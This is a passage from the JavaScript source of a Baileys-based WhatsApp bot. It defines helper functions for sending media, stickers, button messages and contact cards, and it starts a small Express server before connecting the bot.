          return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
          return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
        }
      }
      
      conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0]
        let isEphemeral = mtype === 'ephemeralMessage'
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
        let content = msg[mtype]
        if (typeof content === 'string') msg[mtype] = text || content
        else if (content.caption) content.caption = text || content.caption
        else if (content.text) content.text = text || content.text
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        }
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
        copy.key.remoteJid = jid
        copy.key.fromMe = sender === conn.user.id
      
        return proto.WebMessageInfo.fromObject(copy)
      }
      
      conn.getFile = async(PATH, save) => {
        let res
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        }
      
      }
      
      conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
        let types = await conn.getFile(PATH, true)
        let { filename, size, ext, mime, data } = types
        let type = '',
            mimetype = mime,
            pathFile = filename
        if (options.asDocument) type = 'document'
        if (options.asSticker || /webp/.test(mime)) {
            let { writeExif } = require('./exif.js')
            let media = { mimetype: mime, data }
            pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
            await fs.promises.unlink(filename)
            type = 'sticker'
            mimetype = 'image/webp'
        } else if (/image/.test(mime)) type = 'image'
        else if (/video/.test(mime)) type = 'video'
        else if (/audio/.test(mime)) type = 'audio'
        else type = 'document'
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            mimetype,
            fileName,
            ...options
        }, { quoted, ...options })
        return fs.promises.unlink(pathFile)
      }
      
      conn.parseMention = async(text) => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
      }
      
      conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
        let types = await conn.getFile(path, true)
        let { mime, ext, res, data, filename } = types
        if (res && res.status !== 200 || file.length <= 65536) {
            try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
        }
        let type = '',
            mimetype = mime,
            pathFile = filename
        if (options.asDocument) type = 'document'
        if (options.asSticker || /webp/.test(mime)) {
            let { writeExif } = require('./exif')
            let media = { mimetype: mime, data }
            pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
            await fs.promises.unlink(filename)
            type = 'sticker'
            mimetype = 'image/webp'
        } else if (/image/.test(mime)) type = 'image'
        else if (/video/.test(mime)) type = 'video'
        else if (/audio/.test(mime)) type = 'audio'
        else type = 'document'
        await conn.sendMessage(jid, {
            [type]: { url: pathFile },
            caption,
            mimetype,
            fileName,
            ...options
        }, { quoted, ...options })
        return fs.promises.unlink(pathFile)
      }
      
      conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
          buffer = await writeExifVid(buff, options);
        } else {
          buffer = await videoToWebp(buff);
        }
        await conn.sendMessage(
          jid,
          { sticker: { url: buffer }, ...options },
          options
        );
      };
      
      conn.sendImageAsSticker = async (jid, buff, options = {}) => {
        let buffer;
        if (options && (options.packname || options.author)) {
          buffer = await writeExifImg(buff, options);
        } else {
          buffer = await imageToWebp(buff);
        }
        await conn.sendMessage(
          jid,
          { sticker: { url: buffer }, ...options },
          options
        );
      };
      
      conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
      
      conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
      }
      
      conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
      
      conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
        let buttonMessage = {
                text,
                footer,
                buttons,
                headerType: 2,
                ...options
            }
        conn.sendMessage(jid, buttonMessage, { quoted, ...options })
      }
      
      conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
        let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
        var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
            templateMessage: {
                hydratedTemplate: {
                    imageMessage: message.imageMessage,
                    "hydratedContentText": text,
                    "hydratedFooterText": footer,
                    "hydratedButtons": but
                }
            }
        }), options)
        conn.relayMessage(jid, template.message, { messageId: template.key.id })
      }
      
      conn.getName = (jid, withoutContact = false) => {
        id = conn.decodeJid(jid);
        withoutContact = conn.withoutContact || withoutContact;
        let v;
        if (id.endsWith('@g.us'))
            return new Promise(async resolve => {
                v = store.contacts[id] || {};
                if (!(v.name.notify || v.subject))
                    v = conn.groupMetadata(id) || {};
                resolve(
                    v.name ||
                        v.subject ||
                        PhoneNumber(
                            '+' + id.replace('@s.whatsapp.net', ''),
                        ).getNumber('international'),
                );
            });
        else
            v =
                id === '0@s.whatsapp.net'
                    ? {
                            id,
                            name: 'WhatsApp',
                      }
                    : id === conn.decodeJid(conn.user.id)
                    ? conn.user
                    : store.contacts[id] || {};

        return (
            (withoutContact ? '' : v.name) ||
            v.subject ||
            v.verifiedName ||
            PhoneNumber(
                '+' + jid.replace('@s.whatsapp.net', ''),
            ).getNumber('international')
        );
      };

      conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        let list = [];
        for (let i of kon) {
            list.push({
                displayName: await conn.getName(i + '@s.whatsapp.net'),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                    i + '@s.whatsapp.net',
                )}\nFN:${
                    global.OwnerName
                }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                    global.email
                }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                    global.github
                }/kamran-md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                    global.location
                };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
            });
        }
        conn.sendMessage(
            jid,
            {
                contacts: {
                    displayName: `${list.length} Contact`,
                    contacts: list,
                },
                ...opts,
            },
            { quoted },
        );
      };

      conn.setStatus = status => {
        conn.query({
            tag: 'iq',
            attrs: {
                to: '@s.whatsapp.net',
                type: 'set',
                xmlns: 'status',
            },
            content: [
                {
                    tag: 'status',
                    attrs: {},
                    content: Buffer.from(status, 'utf-8'),
                },
            ],
        });
        return status;
      };
      
      conn.serializeM = mek => sms(conn, mek, store);
  }

  //╔═══════════════════════════════════════════════════════════════╗
  //║                    EXPRESS SERVER ROUTES                       ║
  //╚═══════════════════════════════════════════════════════════════╝

  app.use(express.static(path.join(__dirname, 'lib')));

  app.get('/', (req, res) => {
    res.redirect('/irfan.html');
  });
  
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  
  //╔═══════════════════════════════════════════════════════════════╗
  //║                    START BOT CONNECTION                        ║
  //╚═══════════════════════════════════════════════════════════════╝
  
  setTimeout(() => {
    connectToWA()
  }, 4000);
